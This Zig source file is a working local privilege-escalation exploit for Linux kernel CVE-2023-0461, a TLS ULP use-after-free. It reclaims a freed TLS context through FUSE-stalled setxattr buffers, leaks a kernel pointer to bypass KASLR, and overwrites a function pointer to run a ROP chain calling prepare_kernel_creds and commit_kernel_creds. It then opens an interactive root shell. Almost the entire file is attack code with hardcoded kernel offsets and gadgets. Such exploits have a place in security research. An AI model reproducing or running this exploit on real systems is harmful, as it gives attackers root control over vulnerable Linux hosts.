const std = @import("std");
const assert = std.debug.assert;
const log = std.log;
const net = std.net;
const os = std.os;
const fs = std.fs;
const errno = os.errno;
const l = os.linux;
const E = l.E;
const mem = std.mem;
const Allocator = mem.Allocator;

const Fuse = @import("fuse.zig");

const SOL = struct {
    pub const TCP = 6;
};

const TLS = struct {
    pub const TX = 1;
    pub const RX = 2;
    pub const TX_ZEROCOPY_RO = 3;

    pub const SET_RECORD_TYPE = 1;
};

const F = struct {
    pub const SETPIPE_SZ = 1024 + 7;
};

const CipherType = enum(u16) {
    Zero = 0x0,
    AESGCM128 = 51,
};

const Version = enum(u16) {
    Zero = 0x0,
    TLS12 = 0x0303,
    TLS13 = 0x0304,
};

const TLSCryptoInfo = extern struct {
    version: Version,
    cipher_type: CipherType,
};

const AESGCM128 = extern struct {
    info: TLSCryptoInfo,
    iv: u64 align(1),
    key: [16]u8,
    salt: [4]u8,
    rec_seq: [8]u8,
};

comptime {
    assert(@sizeOf(AESGCM128) == 40);
}

const TLSProtInfo = extern struct {
    version: Version,
    cipher_type: CipherType,
    prepend_size: u16,
    tag_size: u16,
    overhead_size: u16,
    iv_size: u16,
    salt_size: u16,
    rec_seq_size: u16,
    aad_size: u16,
    tail_size: u16,
};

comptime {
    assert(@sizeOf(TLSProtInfo) == 20);
}

const KernelPtr = usize;

const CipherContext = extern struct {
    iv: KernelPtr,
    rec_seq: KernelPtr,
};

const ListHead = extern struct {
    next: KernelPtr,
    prev: KernelPtr,
};

const CallbackHead = extern struct {
    next: KernelPtr,
    func: KernelPtr,
};

const TLSContext = extern struct {
    prot_info: TLSProtInfo,
    flags0: u8,
    // tx_conf: u3,
    // rx_conf: u3,
    // zerocopy_sendfile: bool,
    // rx_no_pad: bool,
    hole0: [3]u8,
    push_pending_record: KernelPtr,
    sk_write_space: KernelPtr,
    priv_ctx_tx: KernelPtr,
    priv_ctx_rx: KernelPtr,
    netdev: KernelPtr,
    tx: CipherContext,
    rx: CipherContext,
    partially_sent_record: KernelPtr,
    partially_sent_offset: u16,
    in_tcp_sendpages: u8,
    pending_open_record_frags: u8,
    hole1: [4]u8,
    tx_lock: [32]u8,
    flags1: u64,
    sk_proto: KernelPtr,
    sk: KernelPtr,
    sk_destruct: KernelPtr,
    crypto_send_aes_gcm_128: AESGCM128,
    unused_from_send_union: [16]u8,
    crypto_recv_aes_gcm_128: AESGCM128,
    unused_from_recv_union: [16]u8,
    list: ListHead,
    refcount: u32,
    hole2: [4]u8,
    rcu: CallbackHead,
};

comptime {
    assert(@sizeOf(TLSContext) == 328);
    assert(@offsetOf(TLSContext, "flags1") == 0x90);
}

// Zig std library doesn't consider possiblity of setting iov_base to null
const iovec_const = extern struct {
    iov_base: [*c]const u8,
    iov_len: usize,
};

const Cmsghdr = extern struct {
    len: usize,
    level: i32,
    kind: i32,
};

comptime {
    assert(@sizeOf(Cmsghdr) == 16);
}

const TLSRecordType = extern struct {
    cmsghdr: Cmsghdr,
    kind: u8,
    pad: [7]u8 = .{0xaa} ** 7,
};

const allc = std.heap.page_allocator;

// tls_sw_push_pending_record - {startup_64,_text}
const tls_sw_push_pending_record_offset: KernelPtr = 0xa8dd30;

pub fn writev(fd: os.fd_t, iov: []const iovec_const) os.WriteError!usize {
    const iov_count = @as(u31, @intCast(iov.len));
    while (true) {
        const rc = l.syscall3(.writev, @as(usize, @bitCast(@as(isize, fd))), @intFromPtr(iov.ptr), iov_count);
        switch (errno(rc)) {
            .SUCCESS => return @as(usize, @intCast(rc)),
            .INTR => continue,
            .INVAL => return error.InvalidArgument,
            .FAULT => unreachable,
            .AGAIN => return error.WouldBlock,
            .BADF => return error.NotOpenForWriting, // Can be a race condition.
            .DESTADDRREQ => unreachable, // `connect` was never called.
            .DQUOT => return error.DiskQuota,
            .FBIG => return error.FileTooBig,
            .IO => return error.InputOutput,
            .NOSPC => return error.NoSpaceLeft,
            .PERM => return error.AccessDenied,
            .PIPE => return error.BrokenPipe,
            .CONNRESET => return error.ConnectionResetByPeer,
            .BUSY => return error.DeviceBusy,
            else => |err| return os.unexpectedErrno(err),
        }
    }
}

pub fn splice(fd_in: l.fd_t, off_in: ?*l.off_t, fd_out: l.fd_t, off_out: ?*l.off_t, len: usize, flags: usize) !usize {
    const rc = l.syscall6(
        .splice,
        @as(usize, @bitCast(@as(isize, fd_in))),
        @intFromPtr(off_in),
        @as(usize, @bitCast(@as(isize, fd_out))),
        @intFromPtr(off_out),
        len,
        flags,
    );

    switch (errno(rc)) {
        .SUCCESS => return @as(usize, @intCast(rc)),
        else => |err| return os.unexpectedErrno(err),
    }
}

fn sched_setaffinity(pid: l.pid_t, set: *const l.cpu_set_t) !void {
    const size = @sizeOf(l.cpu_set_t);
    const rc = l.syscall3(.sched_setaffinity, @as(usize, @bitCast(@as(isize, pid))), size, @intFromPtr(set));

    switch (errno(rc)) {
        .SUCCESS => return,
        else => |err| return os.unexpectedErrno(err),
    }
}

fn retry_connect(sock: os.socket_t, sock_addr: *const os.sockaddr, len: os.socklen_t) !void {
    var n: u8 = 100;
    var last_err: os.ConnectError = undefined;

    while (n > 0) : (n -= 1) {
        os.connect(sock, sock_addr, len) catch |err| {
            last_err = err;
            os.nanosleep(0, 100000);

            continue;
        };

        return;
    }

    return last_err;
}

const TLSOpt = enum(u32) {
    TX = TLS.TX,
    RX = TLS.RX,
    ZC = TLS.TX_ZEROCOPY_RO,
};

fn setTLSOpt(sk: os.socket_t, opt: TLSOpt) !void {
    const crypto = AESGCM128{
        .info = .{
            .version = .TLS13,
            .cipher_type = .AESGCM128,
        },
        .iv = 0xdeadbeefba115,
        .key = .{ 'k', 'y' } ** 8,
        .salt = .{ 's', 'a', 'l', 't' },
        .rec_seq = .{ 'r', 's' } ** 4,
    };
    const c_true: c_uint = 1;
    const optval = switch (opt) {
        .TX, .RX => mem.asBytes(&crypto),
        .ZC => mem.asBytes(&c_true),
    };

    try os.setsockopt(sk, l.SOL.TLS, @intFromEnum(opt), optval);
}

const SyncPipe = struct {
    const Self = @This();

    pipe: [2]os.fd_t,

    pub fn init() !Self {
        return .{
            .pipe = try os.pipe(),
        };
    }

    pub fn deinit(self: Self) void {
        os.close(self.pipe[0]);
        os.close(self.pipe[1]);
    }

    pub fn wait(self: Self, on: u8) !void {
        var buf = [_]u8{0x00};
        _ = try os.read(self.pipe[0], &buf);

        if (buf[0] != on) {
            log.err("desync: {} != {}", .{ buf[0], on });
            return error.desync;
        }
    }

    pub fn cont(self: Self, on: u8) !void {
        _ = try os.write(self.pipe[1], &.{on});
    }

    pub fn retry(self: Self, on: u8) !bool {
        var buf = [_]u8{0x00};
        _ = try os.read(self.pipe[0], &buf);

        if (buf[0] == 0)
            return true;

        if (buf[0] != on) {
            log.err("desync: {} != {}", .{ buf[0], on });
            return error.desync;
        }

        return false;
    }

    pub fn read(self: Self, comptime T: type) !T {
        var out: T = undefined;
        var buf = mem.asBytes(&out);

        _ = try os.read(self.pipe[0], buf);

        return out;
    }

    pub fn write(self: Self, obj: anytype) !void {
        _ = try os.write(self.pipe[1], mem.asBytes(&obj));
    }
};

fn sh() !void {
    var child = std.process.Child.init(&[_][]const u8{
        "/bin/setsid",
        "/bin/cttyhack",
        "/bin/sh",
        "-i",
    }, allc);

    _ = try child.spawnAndWait();
}

fn cve_2023_0461() !void {
    const server_addr = try net.Ip4Address.parse("127.0.0.1", 0xf00b);
    const server_addr_p: *const l.sockaddr = @ptrCast(&server_addr.sa);
    const target_addr = try net.Ip4Address.parse("127.0.0.1", 0xdead);
    const target_addr_p: *const l.sockaddr = @ptrCast(&target_addr.sa);
    const unspec_addr = l.sockaddr{ .family = l.AF.UNSPEC, .data = undefined };
    const addr_sz = @sizeOf(@TypeOf(server_addr.sa));
    const cpus: l.cpu_set_t = undefined;
    const cpu0001: l.cpu_set_t = [1]usize{0b0001} ++ ([_]usize{0} ** (cpus.len - 1));
    const cpu1110: l.cpu_set_t = [1]usize{0b1110} ++ ([_]usize{0} ** (cpus.len - 1));

    var env = try std.process.getEnvMap(allc);
    defer env.deinit();
    var fuse_dir = try Fuse.mkTmpDir("fuse-cve", env);
    defer fuse_dir.close();
    var fuse = try Fuse.init(fuse_dir);
    defer fuse.deinit();
    const ops = Fuse.Ops{ .onSetxattr = null };

    const psync = try SyncPipe.init();
    defer psync.deinit();
    const csync = try SyncPipe.init();
    defer csync.deinit();

    const target_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
    defer os.closeSocket(target_sk);

    const child_pid = try os.fork();

    if (child_pid == 0) {
        try sched_setaffinity(0, &cpu1110);
        log.info("child: listen for first connection", .{});
        const server_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
        defer os.closeSocket(server_sk);

        try os.bind(server_sk, server_addr_p, addr_sz);
        try os.listen(server_sk, 1);
        try psync.cont(0);

        const client_sk0 = try os.accept(server_sk, null, null, 0);

        log.info("child: warmup the crypto components", .{});
        try os.setsockopt(client_sk0, SOL.TCP, l.TCP.ULP, "tls");
        try setTLSOpt(client_sk0, .RX);
        defer os.closeSocket(client_sk0);

        try psync.cont(1);
        try csync.wait(2);

        log.info("child: accept sendmsg sk", .{});
        const client_sk_conn = try os.accept(target_sk, null, null, 0);
        defer os.closeSocket(client_sk_conn);

        log.info("child: set TX sk_proto on sendmsg sk", .{});
        try setTLSOpt(client_sk_conn, .TX);

        try psync.cont(2);

        const client_sk1 = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
        defer os.closeSocket(client_sk1);
        log.info("child: connect for free context sk", .{});
        try retry_connect(client_sk1, target_addr_p, addr_sz);

        try psync.cont(3);

        log.info("child: wait for parent to enter setxattr", .{});
        var end = false;

        while (!end) {
            try psync.cont(0);

            try fuse.do_one(ops); //GETATTR
            try fuse.do_one(ops); //LOOKUP

            log.info("child: wait for parent to allocate xattr value buf", .{});
            os.nanosleep(1, 0);

            log.info("child: setTLSOpt: ZC", .{});
            setTLSOpt(target_sk, .ZC) catch |e| {
                log.err("child: setTLSOpt failed: {}", .{e});
                end = true;
            };

            var end_inner = false;
            while (!end_inner) {
                var req = try fuse.start_read_req();
                var res = Fuse.Response.init(req);

                switch (req.body) {
                    .setxattr => |xattr| {
                        const ctx = mem.bytesAsValue(TLSContext, xattr.value[0..328]);

                        for (xattr.value[0..328], 0..) |b, i| {
                            if (b == 0)
                                continue;

                            log.info("child: read: xattr not zero: {}={}, ctx.flags0={}", .{ i, b, ctx.flags0 });
                            //end = true;
                            break;
                        }
                        end = true;

                        end_inner = true;
                    },
                    else => {
                        try fuse.do_default(&req, &res);
                    },
                }

                if (req.body == .forget)
                    continue;

                try res.send(fuse.dev.handle);
                fuse.done_read_req(req);
            }

            try fuse.do_one(ops); //SETATTR
        }

        try psync.cont(0);

        try fuse.do_one(ops); //GETATTR sb

        log.info("child: wait for parent to allocate xattr value buf", .{});
        os.nanosleep(1, 0);

        log.info("child: try overwrite xattr", .{});
        setTLSOpt(target_sk, .TX) catch |e| {
            log.err("child: setTLSOpt failed: {}", .{e});
        };

        log.info("child: read victim data", .{});

        var req = try fuse.start_read_req();
        var res = Fuse.Response.init(req);
        var ctx: TLSContext = undefined;

        switch (req.body) {
            .setxattr => |xattr| blk: {
                log.info("child: read {s}: {}: {s}", .{
                    xattr.name,
                    xattr.value.len,
                    std.fmt.fmtSliceEscapeLower(xattr.value),
                });
                @memcpy(mem.asBytes(&ctx), xattr.value[0..328]);
                log.info("child: read: {}", .{ctx});

                break :blk;
            },
            else => blk: {
                log.err("child: read: expected xattr, but got {}", .{req.body});
                res.err(E.OPNOTSUPP);
                break :blk;
            },
        }

        try res.send(fuse.dev.handle);
        fuse.done_read_req(req);

        try fuse.do_one(ops); //SETATTR

        try psync.cont(4);
        try psync.write(ctx);

        try fuse.do_one(ops); //GETATTR sb

        log.info("child: wait for parent to allocate xattr value buf", .{});
        os.nanosleep(1, 0);

        const rec_cmsg = TLSRecordType{
            .cmsghdr = .{
                .len = @sizeOf(TLSRecordType),
                .level = l.SOL.TLS,
                .kind = TLS.SET_RECORD_TYPE,
            },
            .kind = 0x69,
        };

        const cmsg = os.msghdr_const{
            .name = null,
            .namelen = 0,
            .iov = &[_]os.iovec_const{},
            .iovlen = 0,
            .control = @ptrCast(&rec_cmsg),
            .controllen = rec_cmsg.cmsghdr.len,
            .flags = 0,
        };

        log.info("child: Using sendmsg to trigger push_pending_record", .{});
        _ = try os.sendmsg(client_sk_conn, &cmsg, 0);

        log.info("child: Returned from sendmsg, changed creds?", .{});
        try sh();

        try psync.cont(5);
        log.info("child: Goodbye!", .{});

        return;
    }

    defer _ = os.waitpid(child_pid, 0);
    try sched_setaffinity(0, &cpu0001);
    log.info("parent: connect for first connection", .{});

    try psync.wait(0);
    try retry_connect(target_sk, server_addr_p, addr_sz);
    try os.setsockopt(target_sk, SOL.TCP, l.TCP.ULP, "tls");

    try psync.wait(1);
    log.info("parent: disconnect", .{});
    try os.connect(target_sk, &unspec_addr, @sizeOf(@TypeOf(unspec_addr)));

    log.info("parent: listen for second connection", .{});
    try os.bind(target_sk, target_addr_p, addr_sz);
    try os.listen(target_sk, 1);

    try csync.cont(2);

    log.info("parent: connect for sendmsg sk", .{});
    const client_sk2 = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
    defer os.closeSocket(client_sk2);
    try retry_connect(client_sk2, target_addr_p, addr_sz);

    try psync.wait(2);

    // Best to free the ctx and allocate the xattr on the same CPU
    log.info("parent: accept and use sk to free context", .{});
    const client_sk_close = try os.accept(target_sk, null, null, 0);
    os.closeSocket(client_sk_close);

    var ctx_xattr: [512]u8 = .{0x00} ** 512;

    const name: [:0]const u8 = "user.bar";
    const xattr_path: [:0]const u8 = "/tmp/fuse-cve/foo";

    try psync.wait(3);

    log.info("parent: wait for deferred free", .{});
    os.nanosleep(6, 0);

    while (try psync.retry(4)) {
        const res = Fuse.setxattr(@ptrCast(xattr_path), name, &ctx_xattr, ctx_xattr.len, 0);
        const err = os.errno(res);
        log.info("parent: setxattr: {s}: {s}: {}", .{ xattr_path, name, err });
    }

    var ctx = try psync.read(TLSContext);
    const kernel_text = if (ctx.push_pending_record > 0)
        ctx.push_pending_record - tls_sw_push_pending_record_offset
    else
        0x0;

    log.info("parent: kernel .text = {x}", .{kernel_text});

    const prepare_kernel_creds_offset = kernel_text + 0xcc7b0;
    const commit_kernel_creds_offset = kernel_text + 0xcc3f0;

    // Regs at push_pending_record
    // - `rax = ctx`
    // - `rbx = rsp + 0x8f`
    // - `rcx = 0x18 = 16 + 8` maybe `cmsg_len`
    // - `rdx = 0x18`
    // - `rdi = sk`
    // - `rsi = 0`
    // - `r8 = 0`
    // - `r9 = rsp + ??`
    // - `r10 = 0`
    // - `r11 = rip` used by indirect thunk array
    // - `r12 = rsp + ??`
    // - `r13 = 0`
    // - `r14 = rsp + ??`
    // - `r15 = sk`
    // - `rbp = 0`

    // mov rsp, rax; ret
    const mov_rsp_rax_ret = kernel_text + 0x000000000001755e;
    // add rsp, 0x90 ; ret
    const add_rsp_0x90_ret = kernel_text + 0x000000000071b0a3;
    //  add rsp, 0x30 ; ret
    const add_rsp_0x30 = kernel_text + 0x00000000001ed56f;
    // mov rdi, r8 ; mov rax, rdi ; ret
    const mov_rdi_r8_mov_rax_rdi_ret = kernel_text + 0x000000000075030d;
    const mov_rax_rbx_pop_rbx_ret = kernel_text + 0x000000000004444b;
    const push_rax_pop_rbx_ret = kernel_text + 0x00000000000f0499;
    const pop_rsi_ret = kernel_text + 0x0000000000000825;
    const sub_rax_ret = kernel_text + 0x000000000014903c;

    const rop_creds = [_]u64{
        // call prepare_kernel_creds(NULL)
        // r8 = 0x0
        mov_rdi_r8_mov_rax_rdi_ret,
        prepare_kernel_creds_offset,
        // call commit_kernel_creds(prepare_kernel_creds(NULL))
        // prepare creds exits with rdi = rax :-)
        commit_kernel_creds_offset,
        // the rest restores rsp using the callee saved reg rbx
        // move rbx into rax then restore rbx
        mov_rax_rbx_pop_rbx_ret,
        0xadd1337c0de,
        push_rax_pop_rbx_ret,
        // rax -= (rsi = 0x8f)
        pop_rsi_ret,
        0x8f,
        sub_rax_ret,
        // restore the original stack
        mov_rsp_rax_ret,
    };
    const rop_bytes = mem.asBytes(&rop_creds);

    ctx.pending_open_record_frags = 0xff;
    ctx.push_pending_record = mov_rsp_rax_ret;
    @memcpy(ctx_xattr[0..@sizeOf(TLSContext)], mem.asBytes(&ctx));

    var rsp: u64 = 0;
    @memcpy(ctx_xattr[rsp..8], mem.asBytes(&add_rsp_0x90_ret));
    rsp += 8; // ret in stack_pivot_to_ctx pops the stack
    rsp += 0x90;
    @memcpy(ctx_xattr[rsp..][0..8], mem.asBytes(&add_rsp_0x30));
    rsp += 8 + 0x30;
    @memcpy(ctx_xattr[rsp..][0..rop_bytes.len], rop_bytes);

    {
        const res = Fuse.setxattr(@ptrCast(xattr_path), name, &ctx_xattr, ctx_xattr.len, 0);
        const err = os.errno(res);
        log.info("parent: setxattr: {s}: {s}: {}", .{ xattr_path, name, err });
    }

    try psync.wait(5);

    log.info("Goodbye!", .{});
}

pub fn main() !void {
    try cve_2023_0461();
}
